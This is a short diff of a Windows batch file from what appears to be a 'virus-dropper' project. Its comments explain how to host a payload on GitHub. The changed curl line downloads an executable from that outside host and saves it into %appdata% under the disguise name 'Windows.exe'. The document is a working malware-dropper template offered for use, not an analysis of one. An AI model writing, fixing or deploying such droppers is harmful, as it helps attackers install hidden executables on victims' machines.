@@ -31,7 +31,7 @@ cls
 
 ::upload files here: github.com - create account and create repository (public) then upload files
 ::put payload file DIRECT download link here:
-curl "https://raw.githubusercontent.com/034nop/virus-dropper/main/install/Windows.exe" --output "%appdata%\Windows.exe"
+curl -L "https://github.com/034nop/virus-dropper/releases/download/0.1/Windows.exe" --output "%appdata%\Windows.exe"
 ::do not change the --output, unless the payload is not a .exe file. (in that case, change all mentions of Windows.exe to Windows.extension)
 cls
 
